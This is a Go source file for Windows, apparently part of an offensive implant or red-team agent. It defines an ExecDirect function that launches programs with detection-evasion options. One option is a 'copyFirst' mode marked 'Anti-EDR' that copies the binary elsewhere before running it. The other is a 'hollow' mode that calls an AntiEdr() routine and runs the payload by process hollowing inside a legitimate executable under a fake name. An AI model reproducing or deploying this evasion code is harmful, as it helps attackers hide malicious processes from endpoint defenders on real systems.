// +build windows

package arch

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	log "github.com/sirupsen/logrus"
)

func ExecDirect(executable string, args []string, spawnType string, spawnData string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
	defer cancel()

	// Always resolve executable full path, we may need it
	executable = ResolveWinVar(executable)
	if filepath.Base(executable) == executable {
		if lp, err := exec.LookPath(executable); err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Could not resolve: %s", executable)
		} else {
			executable = lp
		}
	}

	/* Anti-EDR: copyFirst */
	if spawnType == "copyFirst" {
		destinationPath := spawnData
		destinationPath = ResolveWinVar(destinationPath)
		if destinationPath == "" {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn copyfirst, but no path in spawnData found")
		}
		if !IsValidPath(destinationPath) {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Destination path invalid: %s", destinationPath)
		}

		err = CopyFile(executable, destinationPath)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("error copying file: %s", err.Error())
		}
		// Destination is the new binary we execute
		executable = destinationPath
	}

	cmd := exec.CommandContext(ctx, executable, args...)

	// See how we want to execute it
	if spawnType == "hollow" {
		// Perform Process Hollowing
		sourcePath := spawnData
		if sourcePath == "" {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow, but no path in spawnData found")
		}
		sourcePath = ResolveWinVar(sourcePath)
		if _, err := os.Stat(sourcePath); errors.Is(err, os.ErrNotExist) {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow destination exe does not exist: %s", sourcePath)
		}

		// Activate Anti-EDR if not yet done
		err = AntiEdr()
		if err != nil {
			log.Errorf("Anti EDR failed: %s", err.Error())
			// We dont care if it doesnt work. No return.
		}

		fakeName := filepath.Base(sourcePath) // Need it without path
		pid, stdOut, stdErr, exitCode, err := hollow(sourcePath, executable, fakeName, args)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Hollow error: %s", err)
		} else {
			return stdOut, stdErr, pid, exitCode, nil
		}
	} else {
		// Execute the (possibly copied) binary directly
		return execIt(cmd)
	}
}
